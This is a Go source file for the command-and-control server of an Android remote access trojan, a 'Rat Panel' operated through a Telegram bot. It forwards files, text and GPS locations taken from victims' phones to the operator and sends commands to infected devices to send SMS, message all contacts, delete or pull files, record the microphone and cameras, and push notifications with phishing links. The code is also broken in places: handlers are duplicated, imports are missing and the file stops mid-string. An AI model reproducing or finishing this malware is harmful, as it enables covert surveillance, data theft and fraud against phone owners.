package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/joho/godotenv"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/go-resty/resty/v2"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

var (
	telegramToken string
	chatID        int64
	upgrader      = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true
		},
	}
	bot     *tgbotapi.BotAPI
	clients sync.Map
)

type WebSocketClient struct {
	UUID string
	Info map[string]string
}

var appSocket struct {
	clients []*websocket.Conn
}

var address string = "http://example.com" // Replace with actual address

func rootHandler(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("Welcome to the server"))
}

func uploadFileHandler(w http.ResponseWriter, r *http.Request) {
	// Handle file uploads
	w.Write([]byte("File upload not implemented"))
}

func uploadTextHandler(w http.ResponseWriter, r *http.Request) {
	// Handle text uploads
	w.Write([]byte("Text upload not implemented"))
}

func uploadLocationHandler(w http.ResponseWriter, r *http.Request) {
	// Handle location uploads
	w.Write([]byte("Location upload not implemented"))
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Error upgrading WebSocket:", err)
		return
	}
	defer conn.Close()

	// Add WebSocket connection to appSocket
	appSocket.clients = append(appSocket.clients, conn)

	for {
		messageType, p, err := conn.ReadMessage()
		if err != nil {
			log.Println("Error reading message:", err)
			return
		}
		log.Printf("Received: %s\n", p)

		err = conn.WriteMessage(messageType, p)
		if err != nil {
			log.Println("Error writing message:", err)
			return
		}
	}
}

func mustParseInt64(value string) int64 {
	v, err := strconv.ParseInt(value, 10, 64)
	if err != nil {
		log.Fatalf("Failed to parse int64: %v", err)
	}
	return v
}

func main() {
	// Load .env variables
	err := godotenv.Load()
	if err != nil {
		log.Fatal("Error loading .env file")
	}
	telegramToken = os.Getenv("TELEGRAM_TOKEN")
	chatID = mustParseInt64(os.Getenv("CHAT_ID"))

	// Initialize Telegram bot
	bot, err = tgbotapi.NewBotAPI(telegramToken)
	if err != nil {
		log.Fatalf("Failed to initialize bot: %v", err)
	}

	// API and WebSocket server
	go func() {
		router := mux.NewRouter()
		router.HandleFunc("/", rootHandler).Methods("GET")
		router.HandleFunc("/uploadFile", uploadFileHandler).Methods("POST")
		router.HandleFunc("/uploadText", uploadTextHandler).Methods("POST")
		router.HandleFunc("/uploadLocation", uploadLocationHandler).Methods("POST")
		router.HandleFunc("/ws", wsHandler)

		httpServer := &http.Server{
			Addr:    ":8080",
			Handler: router,
		}

		fmt.Println("API server running on port 8080...")
		log.Fatal(httpServer.ListenAndServe())
	}()

	// Ping and HTTP request monitoring server
	go func() {
		for {
			for _, ws := range appSocket.clients {
				err := ws.WriteMessage(websocket.TextMessage, []byte("ping"))
				if err != nil {
					log.Println("Error sending ping:", err)
				}
			}

			client := resty.New()
			_, err := client.R().Get(address)
			if err != nil {
				log.Println("Error with HTTP request:", err)
			}

			// Wait for 5 seconds before next iteration
			time.Sleep(5 * time.Second)
		}
	}()

	// Start auxiliary server on port 8999
	go func() {
		fmt.Println("Auxiliary server running on port 8999...")
		log.Fatal(http.ListenAndServe(":8999", nil))
	}()

	// Prevent the main function from exiting
	select {}
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("<h1 align=\"center\">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>"))
}

func uploadFileHandler(w http.ResponseWriter, r *http.Request) {
	err := r.ParseMultipartForm(10 << 20) // 10MB max file size
	if err != nil {
		http.Error(w, "Unable to parse form", http.StatusBadRequest)
		return
	}

	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "File upload error", http.StatusBadRequest)
		return
	}
	defer file.Close()

	buffer := bytes.NewBuffer(nil)
	if _, err := buffer.ReadFrom(file); err != nil {
		http.Error(w, "File read error", http.StatusInternalServerError)
		return
	}

	caption := fmt.Sprintf("°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>%s</b> 𝙙𝙚𝙫𝙞𝙘𝙚", r.Header.Get("Model"))
	doc := tgbotapi.NewDocument(chatID, tgbotapi.FileBytes{Name: header.Filename, Bytes: buffer.Bytes()})
	doc.Caption = caption
	doc.ParseMode = "HTML"
	if _, err := bot.Send(doc); err != nil {
		http.Error(w, "Telegram upload error", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusOK)
}

func uploadTextHandler(w http.ResponseWriter, r *http.Request) {
	text := r.FormValue("text")
	message := fmt.Sprintf("°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>%s</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n%s", r.Header.Get("Model"), text)
	msg := tgbotapi.NewMessage(chatID, message)
	msg.ParseMode = "HTML"
	if _, err := bot.Send(msg); err != nil {
		http.Error(w, "Telegram send error", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusOK)
}

func uploadLocationHandler(w http.ResponseWriter, r *http.Request) {
	lat := r.FormValue("lat")
	lon := r.FormValue("lon")
	message := fmt.Sprintf("°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>%s</b> 𝙙𝙚𝙫𝙞𝙘𝙚", r.Header.Get("Model"))

	location := tgbotapi.NewLocation(chatID, mustParseFloat64(lat), mustParseFloat64(lon))
	msg := tgbotapi.NewMessage(chatID, message)
	msg.ParseMode = "HTML"

	if _, err := bot.Send(location); err != nil {
		http.Error(w, "Telegram location error", http.StatusInternalServerError)
		return
	}
	if _, err := bot.Send(msg); err != nil {
		http.Error(w, "Telegram message error", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusOK)
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	uuid := uuid.NewString()
	info := map[string]string{
		"Model":      r.Header.Get("Model"),
		"Battery":    r.Header.Get("Battery"),
		"Version":    r.Header.Get("Version"),
		"Brightness": r.Header.Get("Brightness"),
		"Provider":   r.Header.Get("Provider"),
	}

	clients.Store(uuid, info)

	defer func() {
		clients.Delete(uuid)
		notifyDisconnection(info)
	}()

	notifyConnection(info)

	// Handle WebSocket messages if needed
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			log.Printf("WebSocket read error: %v", err)
			break
		}
	}
}

func notifyConnection(info map[string]string) {
	message := fmt.Sprintf(
		`°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙
		• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>%s</b>
		• ʙᴀᴛᴛᴇʀʏ : <b>%s</b>
		• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>%s</b>
		• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>%s</b>
		• ᴘʀᴏᴠɪᴅᴇʀ : <b>%s</b>`,
		info["Model"], info["Battery"], info["Version"], info["Brightness"], info["Provider"])
	msg := tgbotapi.NewMessage(chatID, message)
	msg.ParseMode = "HTML"
	bot.Send(msg)
}

func notifyDisconnection(info map[string]string) {
	message := fmt.Sprintf(
		`°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙
		• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>%s</b>
		• ʙᴀᴛᴛᴇʀʏ : <b>%s</b>
		• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>%s</b>
		• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>%s</b>
		• ᴘʀᴏᴠɪᴅᴇʀ : <b>%s</b>`,
		info["Model"], info["Battery"], info["Version"], info["Brightness"], info["Provider"])
	msg := tgbotapi.NewMessage(chatID, message)
	msg.ParseMode = "HTML"
	bot.Send(msg)
}

func mustParseInt64(value string) int64 {
	result, err := strconv.ParseInt(value, 10, 64)
	if err != nil {
		log.Fatalf("Invalid int64 value: %s", value)
	}
	return result
}

func mustParseFloat64(value string) float64 {
	result, err := strconv.ParseFloat(value, 64)
	if err != nil {
		log.Fatalf("Invalid float64 value: %s", value)
	}
	return result
}
bot.HandleMessage(func(message *tgbotapi.Message) {
	chatID := message.Chat.ID

	if message.ReplyToMessage != nil {
		replyText := message.ReplyToMessage.Text

		if strings.Contains(replyText, "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎") {
			currentNumber = message.Text
			reply := tgbotapi.NewMessage(chatID, `°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧

        • ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ`)
			reply.ReplyMarkup = tgbotapi.ForceReply{ForceReply: true}
			bot.Send(reply)
		}

		if strings.Contains(replyText, "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧") {
			wsClients.Range(func(key, value interface{}) bool {
				ws := value.(*WebSocketClient)
				if ws.UUID == currentUuid {
					ws.Conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("send_message:%s/%s", currentNumber, message.Text)))
				}
				return true
			})

			currentNumber = ""
			currentUuid = ""

			reply := tgbotapi.NewMessage(chatID, `°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨

        • ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ`)
			reply.ParseMode = "HTML"
			reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
				tgbotapi.NewKeyboardButtonRow(
					tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
					tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
				),
			)
			bot.Send(reply)
		}
        if strings.Contains(replyText, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨") {
            messageToAll := message.Text

            wsClients.Range(func(key, value interface{}) bool {
                ws := value.(*WebSocketClient)
                if ws.UUID == currentUuid {
                    ws.Conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("send_message_to_all:%s", messageToAll)))
                }
                return true
            })

            currentUuid = ""

            reply := tgbotapi.NewMessage(chatID, `°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨

        • ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ`)
            reply.ParseMode = "HTML"
            reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
                tgbotapi.NewKeyboardButtonRow(
                    tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
                    tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
                ),
            )
            bot.Send(reply)
        }
        if strings.Contains(replyText, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙") {
            path := message.Text

            wsClients.Range(func(key, value interface{}) bool {
                ws := value.(*WebSocketClient)
                if ws.UUID == currentUuid {
                    ws.Conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("file:%s", path)))
                }
                return true
            })

            currentUuid = ""

            reply := tgbotapi.NewMessage(chatID, `°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨

        • ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ`)
            reply.ParseMode = "HTML"
            reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
                tgbotapi.NewKeyboardButtonRow(
                    tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
                    tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
                ),
            )
            bot.Send(reply)
        }
        if strings.Contains(replyText, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚") {
            path := message.Text

            wsClients.Range(func(key, value interface{}) bool {
                ws := value.(*WebSocketClient)
                if ws.UUID == currentUuid {
                    ws.Conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("delete_file:%s", path)))
                }
                return true
            })

            currentUuid = ""

            reply := tgbotapi.NewMessage(chatID, `°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨

        • ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ`)
            reply.ParseMode = "HTML"
            reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
                tgbotapi.NewKeyboardButtonRow(
                    tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
                    tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
                ),
            )
            bot.Send(reply)
        }
        if strings.Contains(replyText, "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙") {
            duration := message.Text

            wsClients.Range(func(key, value interface{}) bool {
                ws := value.(*WebSocketClient)
                if ws.UUID == currentUuid {
                    ws.Conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("microphone:%s", duration)))
                }
                return true
            })

            currentUuid = ""

            reply := tgbotapi.NewMessage(chatID, `°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨

        • ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ`)
            reply.ParseMode = "HTML"
            reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
                tgbotapi.NewKeyboardButtonRow(
                    tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
                    tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
                ),
            )
            bot.Send(reply)
        }
        if strings.Contains(replyText, "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙") {
            duration := message.Text

            wsClients.Range(func(key, value interface{}) bool {
                ws := value.(*WebSocketClient)
                if ws.UUID == currentUuid {
                    ws.Conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("rec_camera_main:%s", duration)))
                }
                return true
            })

            currentUuid = ""

            reply := tgbotapi.NewMessage(chatID, `°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨

        • ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ`)
            reply.ParseMode = "HTML"
            reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
                tgbotapi.NewKeyboardButtonRow(
                    tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
                    tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
                ),
            )
            bot.Send(reply)
        }
        if strings.Contains(replyText, "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙") {
            duration := message.Text

            wsClients.Range(func(key, value interface{}) bool {
                ws := value.(*WebSocketClient)
                if ws.UUID == currentUuid {
                    ws.Conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("rec_camera_selfie:%s", duration)))
                }
                return true
            })

            currentUuid = ""

            reply := tgbotapi.NewMessage(chatID, `°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨

        • ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ`)
            reply.ParseMode = "HTML"
            reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
                tgbotapi.NewKeyboardButtonRow(
                    tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
                    tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
                ),
            )
            bot.Send(reply)
        }
        if strings.Contains(replyText, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚") {
            toastMessage := message.Text

            wsClients.Range(func(key, value interface{}) bool {
                ws := value.(*WebSocketClient)
                if ws.UUID == currentUuid {
                    ws.Conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("toast:%s", toastMessage)))
                }
                return true
            })

            currentUuid = ""

            reply := tgbotapi.NewMessage(chatID, `°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨

        • ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ`)
            reply.ParseMode = "HTML"
            reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
                tgbotapi.NewKeyboardButtonRow(
                    tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
                    tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
                ),
            )
            bot.Send(reply)
        }
        if strings.Contains(replyText, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣") {
            notificationMessage := message.Text
            currentTitle = notificationMessage

            reply := tgbotapi.NewMessage(chatID, `°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣

        • ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ`)
            reply.ReplyMarkup = tgbotapi.ForceReply{ForceReply: true}
            bot.Send(reply)
        }

        if strings.Contains(replyText, "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣") {
            link := message.Text

            wsClients.Range(func(key, value interface{}) bool {
                ws := value.(*WebSocketClient)
                if ws.UUID == currentUuid {
                    ws.Conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("show_notification:%s/%s", currentTitle, link)))
                }
                return true
            })

            currentUuid = ""

            reply := tgbotapi.NewMessage(chatID, `°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨

        • ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ`)
            reply.ParseMode = "HTML"
            reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
                tgbotapi.NewKeyboardButtonRow(
                    tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
                    tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
                ),
            )
            bot.Send(reply)
        }
        if strings.Contains(replyText, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮") {
            audioLink := message.Text

            wsClients.Range(func(key, value interface{}) bool {
                ws := value.(*WebSocketClient)
                if ws.UUID == currentUuid {
                    ws.Conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("play_audio:%s", audioLink)))
                }
                return true
            })

            currentUuid = ""

            reply := tgbotapi.NewMessage(chatID, `°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨

        • ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ`)
            reply.ParseMode = "HTML"
            reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
                tgbotapi.NewKeyboardButtonRow(
                    tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
                    tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
                ),
            )
            bot.Send(reply)
        }
    }
    if chatID == id {
        if message.Text == "/start" {
            reply := tgbotapi.NewMessage(chatID, `°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙋𝙖𝙣𝙚𝙡

    • ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ
